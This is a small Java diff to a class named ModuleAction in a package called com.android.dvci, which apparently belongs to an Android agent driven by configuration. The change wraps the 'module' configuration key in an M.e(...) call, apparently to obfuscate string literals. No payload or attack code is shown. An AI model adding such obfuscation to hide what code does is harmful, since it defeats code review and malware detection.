@@ -13,6 +13,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfAction;
 import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.util.Check;
+import com.android.mm.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -37,7 +38,7 @@ abstract class ModuleAction extends SubAction {
 	protected boolean parse(ConfAction params) {
 
 		try {
-			this.moduleId = params.getString("module");
+			this.moduleId = params.getString(M.e("module"));
 		} catch (ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
